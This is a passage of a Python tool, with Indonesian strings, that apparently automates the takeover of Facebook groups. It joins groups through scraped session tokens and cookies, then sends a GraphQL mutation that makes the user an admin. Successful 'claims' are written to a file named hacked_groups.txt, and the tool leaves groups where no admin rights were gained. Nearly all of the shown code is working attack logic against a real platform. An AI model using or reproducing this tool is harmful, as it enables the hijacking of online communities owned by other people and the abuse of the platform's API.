[[bold green]•[/]] GROUP LINK : [bold green]www.facebook.com/groups/{usr}[/]""", width=60, style="bold white", title="[[bold green] CLAIM SUCCESFUL [/]]"))
                            open("hacked_groups.txt", "a").write(f"""GROUP NAME: {nmgp}
MEMBERS  : {angg.replace("rb","k").replace(",","").replace(" ","")}
GROUP TYPE: {apaa.replace("Publik","Public")}
GROUP LINK : www.facebook.com/groups/{user}\n
""")
                            self.ber.append(usr)
                        else:
                            prints(Panel(f"""[[bold red]-[/]] GROUP NAME: [bold red]{nmgp}[/]
[[bold red]-[/]] GROUP TYPE : [bold red]{apaa.replace("Publik","Public")}[/]
[[bold green]•[/]] MEMBERS  : [bold green]{angg.replace("rb","k").replace(",",".").replace(" ","")}[/]
[[bold red]-[/]] GROUP LINK : [bold red]www.facebook.com/groups/{usr}[/]""", width=60, style="bold white", title="[[bold red] CLAIM FAILED [/]]"))
                        self.gag.append(usr)
                else:
                    prints(Panel(f"""[[bold cyan]•[/]] GROUP NAME: [bold cyan]{nmgp}[/]
[[bold cyan]•[/]] GROUP TYPE : [bold cyan]{apaa.replace("Privat","Private")}[/]
[[bold green]•[/]] MEMBERS  : [bold green]{angg.replace("rb","k").replace(",","").replace(" ","")}[/]
[[bold cyan]•[/]] GROUP LINK : [bold cyan]www.facebook.com/groups/{usr}[/]""", width=60, style="bold white", title="[[bold cyan] PRIVATE GROUP [/]]"))
        #except Exception as e:print(e)
        except requests.exceptions.ConnectionError:
            prog.update(des, description=f"[bold red]SPAM[/]:{str(self.die)} LIVE:{len(self.ber)} CHEK:{len(self.gag)}")
            prog.advance(des)
            time.sleep(5)

    def join_grup(self, use, dat, hed, cok, usr):
        data = {'av': use, '__user': use, '__a': '1', '__req': '13', '__hs': dat["__hs"], 'dpr': '1.5', '__ccg': 'GOOD', '__rev': dat["__rev"], '__hsi': dat["__hsi"], '__comet_req': '15', 'fb_dtsg': dat["fb_dtsg"], 'jazoest': dat["jazoest"], 'lsd': dat["lsd"], '__spin_r': dat["__spin_r"], '__spin_b': 'trunk', '__spin_t': dat["__spin_t"], 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'GroupCometJoinForumMutation', 'variables': json.dumps({"feedType":"DISCUSSION","groupID":usr,"imageMediaType":"image/x-auto","input":{"action_source":"GROUP_MALL","attribution_id_v2":"CometGroupDiscussionRoot.react,comet.group,unexpected,1691244310945,990663,2361831622,","group_id":usr,"group_share_tracking_params":{"app_id":"2220391788200892","exp_id":"null","is_from_share":False},"actor_id":use,"client_mutation_id":"3"},"inviteShortLinkKey":"null","isChainingRecommendationUnit":False,"isEntityMenu":True,"scale":1.5,"source":"GROUP_MALL","renderLocation":"group_mall","__relay_internal__pv__GlobalPanelEnabledrelayprovider":False,"__relay_internal__pv__GroupsCometEntityMenuChannelsrelayprovider":False,"__relay_internal__pv__GroupsCometGroupChatLazyLoadLastMessageSnippetrelayprovider":False}), 'server_timestamps': 'true', 'doc_id': '6421289381324591'}
        head = {'authority': 'web.facebook.com', 'accept': '*/*', 'accept-language': 'id,id-ID;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://web.facebook.com', 'referer': hed["referer"], 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"', 'sec-ch-ua-full-version-list': '"Not/A)Brand";v="99.0.0.0", "Google Chrome";v="115.0.5790.102", "Chromium";v="115.0.5790.102"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '"5.19.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36', 'viewport-width': '923', 'x-asbd-id': '129477', 'x-fb-friendly-name': data["fb_api_req_friendly_name"], 'x-fb-lsd': data["lsd"]}
        jkww = self.ses.post("https://web.facebook.com/api/graphql/", cookies=cok, headers=head, data=data).text
        if "Akun Anda dibatasi saat ini" in jkww:teks = "Batasi"
        else:teks = "Tidakk"
        return teks

    def jadi_admin(self, user, id_grup, cook):
        link = self.ses.get(f"https://web.facebook.com/groups/{id_grup}/members", cookies=cook, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}).text
        date = {'av': user, '_user': user, 'a': '1', 'req': '1a','hs': re.search('"haste_session":"(.*?)",',str(link)).group(1), 'dpr': '1.5', 'ccg': 'GOOD', 'rev': re.search('{"rev":(.*?)}',str(link)).group(1), 'hsi': re.search('"hsi":"(.*?)",',str(link)).group(1),'comet_req': '15', 'fb_dtsg': re.search('"DTSGInitialData":{"token":"(.*?)"}',str(link)).group(1), "jazoest": re.search('&jazoest=(.*?)"', str(link)).group(1), 'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(link)).group(1), 'spin_b': 'trunk', 'spin_r': re.search('"__spin_r":(.*?),', str(link)).group(1), 'spin_t': re.search('"__spin_t":(.*?),',str(link)).group(1), 'fb_api_caller_class': 'RelayModern'}
        head = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7','Accept-Encoding':'gzip, deflate','Accept-Language':'en-US,en;q=0.9','Content-Type':'application/x-www-form-urlencoded','Pragma':'akamai-x-cache-on, akamai-x-cache-remote-on, akamai-x-check-cacheable, akamai-x-get-cache-key, akamai-x-get-extracted-values, akamai-x-get-ssl-client-session-id, akamai-x-get-true-cache-key, akamai-x-serial-no, akamai-x-get-request-id,akamai-x-get-nonces,akamai-x-get-client-ip,akamai-x-feo-trace','Origin':'https://www.facebook.com','Referer':'https://www.facebook.com/pages/creation/?ref_type=launch_point','Sec-Ch-Ua':'','Sec-Ch-Ua-Full-Version-List':'','Sec-Ch-Ua-Mobile':'?0','Sec-Ch-Ua-Platform':'','Sec-Ch-Ua-Platform-Version':'','Sec-Fetch-Dest':'empty','Sec-Fetch-Mode':'cors','Sec-Fetch-Site':'same-origin','Sec-Fetch-User':'?1','Upgrade-Insecure-Requests':'1','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36','X-Fb-Friendly-Name': '','X-Fb-Lsd': date['lsd']}
        date.update({'fb_api_req_friendly_name': 'GroupsCometMembersInviteAdminMutation', 'variables': json.dumps({"groupID": id_grup,"memberID": user,"input":{"admin_type":"admin","group_id": id_grup,"source":"member_list","user_id": user,"actor_id": user,"client_mutation_id":"1"},"scale": "2","isContextualProfile": False}), 'server_timestamps':'true', 'doc_id': '7296704937013412'})
        head.update({'X-Fb-Friendly-Name': date['fb_api_req_friendly_name']})
        post = self.ses.post('https://www.facebook.com/api/graphql/',data=date, headers=head, cookies=cook).text
        if "Gagal Menambah Admin" in post:teks = "Gagal"
        elif "Kesalahan Kueri" in post:teks = "Kesalahan"
        else:teks = "Berhasil"
        return teks

    def dump_join(self):
        try:
            link = self.ses.get(f"{self.url}/groups/?seemore", cookies=self.cookie).text
            cari = re.findall('<a href="(.*?)">(.*?)</a>', str(link))
            for x in cari:
                if "home.php?" in x[0] or "profile.php" in x[0] or "pages" in x[0]:pass
                elif "/groups/?category=membership" in x[0] or "/groups/create/?create_ref=groups_tab" in x[0]:pass
                elif "groups" in x[0]:
                    for i in re.findall("groups/(.*?)/", x[0]):
                        curl = self.ses.get(f"{self.url}/groups/{i}?view=members", cookies=self.cookie).text
                        if "Hapus dari Admin" in str(curl):pass
                        #elif "Admin dan Moderator" not in str(curl):print(f"[*] cek grup: https://web.facebook.com/groups/{i}/members")
                        else:
                            idGP = re.findall('group_id=(.*?)&amp', str(curl))[0]
                            self.exit_group(idGP, x[1])
        except Exception as e:exit(e)

    def exit_group(self, id_grup, nama):
        user = re.findall("c_user=(.*?);", str(self.cookie))[0]
        link = self.ses.get("https://web.facebook.com/groups/joins/?nav_source=tab", cookies=self.cookie, headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"}).text
        varz = {"imageMediaType":"image/x-auto","input":{"attribution_id_v2":"GroupsCometJoinsRoot.react,comet.groups.joins,via_cold_start,1688226830953,776103,,","group_id":id_grup,"actor_id":user,"client_mutation_id":"1"},"inviteShortLinkKey":"null","isChainingRecommendationUnit":False,"isEntityMenu":False,"ordering":["viewer_added"],"scale":1.5,"groupID":id_grup,"__relay_internal__pv__GlobalPanelEnabledrelayprovider":False,"__relay_internal__pv__GroupsCometEntityMenuChannelsrelayprovider":True,"__relay_internal__pv__GroupsCometEntityMenuUseChatThumbnailsrelayprovider":True,"__relay_internal__pv__GroupsCometHasLeftRailNavImprovementrelayprovider":True,"__relay_internal__pv__GroupsCometGroupChatLazyLoadLastMessageSnippetrelayprovider":False}
        date = {'av': user, '__user': user, '__req': 'la', '__hs': re.search('"haste_session":"(.*?)",',str(link)).group(1), 'dpr': '1.5', '__ccg': 'GOOD', '__rev': re.search('{"rev":(.*?)}',str(link)).group(1), '__hsi': re.search('"hsi":"(.*?)",',str(link)).group(1), '__comet_req': '15', 'fb_dtsg': re.search('"DTSGInitialData",\[\],{"token":"(.*?)"',str(link)).group(1), 'jazoest': re.search('&jazoest=(.*?)",',str(link)).group(1), 'lsd': re.search('"LSD",\[\],{"token":"(.*?)"',str(link)).group(1), '__spin_r': re.search('"__spin_r":(.*?),',str(link)).group(1), '__spin_b': 'trunk', '__spin_t': re.search('"__spin_t":(.*?),',str(link)).group(1), 'fb_api_caller_class': 'RelayModern', 'fb_api_req_friendly_name': 'GroupCometLeaveForumMutation', 'variables': json.dumps(varz), 'server_timestamps': 'true', 'doc_id': '6048136201959478'}
        head = {'authority': 'web.facebook.com', 'accept': '*/*', 'accept-language': 'id,id-ID;q=0.9,en-US;q=0.8,en;q=0.7', 'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://web.facebook.com', 'referer': 'https://web.facebook.com/groups/joins/?nav_source=tab', 'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"','sec-ch-ua-full-version-list': '"Not.A/Brand";v="8.0.0.0", "Chromium";v="114.0.5735.106", "Google Chrome";v="114.0.5735.106"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '"5.19.0"', 'sec-fetch-dest': 'empty', 'sec-fetch-mode': 'cors', 'sec-fetch-site': 'same-origin', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36', 'viewport-width': '906', 'x-asbd-id': '129477', 'x-fb-friendly-name': 'GroupCometLeaveForumMutation', 'x-fb-lsd': date["lsd"]}
        hasl = self.ses.post('https://web.facebook.com/api/graphql/', cookies=self.cookie, headers=head, data=date).json()
        if "Kesalahan Kueri" in hasl:pass
        else:print(f"\r [*] {nama}\n[#] SUCCESFULLY EXIT\n")

def prem_puan_puan_puan():
    YoWaimo("").menu()


prem_puan_puan_puan()
